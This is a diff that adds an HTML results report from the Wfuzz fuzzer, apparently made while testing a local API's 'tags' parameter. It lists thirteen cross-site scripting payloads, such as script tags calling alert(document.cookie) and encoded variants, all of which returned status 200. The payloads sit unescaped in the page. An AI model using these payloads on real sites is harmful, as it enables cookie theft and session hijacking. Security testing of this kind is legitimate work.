@@ -1,0 +1,30 @@
+<html><head></head><body bgcolor=#000000 text=#FFFFFF><h1>Fuzzing http://127.0.0.1:5000/api/posts?tags=FUZZ</h1>
+<table border="1">
+<tr><td>#request</td><td>Code</td><td>#lines</td><td>#words</td><td>Url</td></tr>
+
+<tr><td>00006</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='><script>alert(document.cookie);</script>>http://127.0.0.1:5000/api/posts?tags='><script>alert(document.cookie);</script></a></td></tr>
+
+<tr><td>00011</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=&ltscript&gtalert(document.cookie);</script>>http://127.0.0.1:5000/api/posts?tags=&ltscript&gtalert(document.cookie);</script></a></td></tr>
+
+<tr><td>00012</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=&ltscript&gtalert(document.cookie);&ltscript&gtalert>http://127.0.0.1:5000/api/posts?tags=&ltscript&gtalert(document.cookie);&ltscript&gtalert</a></td></tr>
+
+<tr><td>00001</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="><script>">http://127.0.0.1:5000/api/posts?tags="><script>"</a></td></tr>
+
+<tr><td>00007</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\";alert('XSS');//>http://127.0.0.1:5000/api/posts?tags=\";alert('XSS');//</a></td></tr>
+
+<tr><td>00003</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=<<script>alert("WXSS");//<</script>>http://127.0.0.1:5000/api/posts?tags=<<script>alert("WXSS");//<</script></a></td></tr>
+
+<tr><td>00004</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=<script>alert(document.cookie)</script>>http://127.0.0.1:5000/api/posts?tags=<script>alert(document.cookie)</script></a></td></tr>
+
+<tr><td>00002</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=<script>alert("WXSS")</script>>http://127.0.0.1:5000/api/posts?tags=<script>alert("WXSS")</script></a></td></tr>
+
+<tr><td>00010</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E>http://127.0.0.1:5000/api/posts?tags=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E</a></td></tr>
+
+<tr><td>00009</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%3cscript%3ealert(document.cookie);%3c%2fscript%3e>http://127.0.0.1:5000/api/posts?tags=%3cscript%3ealert(document.cookie);%3c%2fscript%3e</a></td></tr>
+
+<tr><td>00008</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%3cscript%3ealert("WXSS");%3c/script%3e>http://127.0.0.1:5000/api/posts?tags=%3cscript%3ealert("WXSS");%3c/script%3e</a></td></tr>
+
+<tr><td>00005</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='><script>alert(document.cookie)</script>>http://127.0.0.1:5000/api/posts?tags='><script>alert(document.cookie)</script></a></td></tr>
+
+<tr><td>00013</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=<xss><script>alert('WXSS')</script></vulnerable>>http://127.0.0.1:5000/api/posts?tags=<xss><script>alert('WXSS')</script></vulnerable></a></td></tr>
+</table></body></html><h5>Wfuzz by EdgeSecurity<h5>
